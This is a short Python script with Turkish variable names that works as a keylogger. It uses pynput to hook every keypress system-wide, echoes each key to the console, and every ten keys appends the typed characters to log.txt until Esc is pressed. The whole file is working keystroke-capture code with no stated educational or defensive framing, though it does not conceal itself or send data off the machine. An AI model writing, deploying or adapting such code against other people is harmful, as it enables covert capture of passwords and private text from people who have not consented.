import pynput
from pynput.keyboard import Key,Listener

sayac = 0
tuslar = []

def tusaBasma(tus):
    global sayac,tuslar
    sayac +=1
    print("{0} basıldı".format(tus))
    tuslar.append(tus)
    if sayac >= 10:
        sayac = 0
        dosyaYaz(tuslar)
        tuslar = []

def dosyaYaz(tuslar):
    with open("log.txt","a",encoding="utf-8") as dosya:
        for tus in tuslar:
            t = str(tus).replace("'","")
            if t.find("space") > 0:
                dosya.write("\n")
            elif t.find("Key") == -1:
                dosya.write(t)

def serbestBirakma(tus):
    if tus == Key.esc:
        print("çıkış")
        return False

with Listener(on_press = tusaBasma,on_release = serbestBirakma) as Listener:
    Listener.join()

